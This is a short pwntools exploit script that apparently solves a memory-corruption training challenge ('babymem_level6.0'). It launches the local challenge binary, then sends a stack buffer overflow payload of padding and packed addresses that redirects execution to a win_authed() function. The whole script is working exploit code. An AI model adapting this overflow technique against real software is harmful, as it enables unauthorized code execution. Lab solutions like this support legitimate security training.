from pwn import * 

context.log_level = 'debug'
context.arch = 'amd64'
context.bits = 64 
context.terminal = ['tmux', 'splitw', '-v']

proc = process(["/challenge/babymem_level6.0"])
proc.recvuntil(b'Payload size: ')

proc.sendline(b'64')

proc.recv()
payload = b'A' * 24 + p64(0x00007ffc00000000) + p64(0x00000000004011d0) + p64(0x00007ffc73c41e40) + p64(0x00007ffc73c42ea0) + p64(0x0000000000402268)
proc.sendline(payload)

proc.interactive()

# return address of the win_authed() function => 0000000000402268
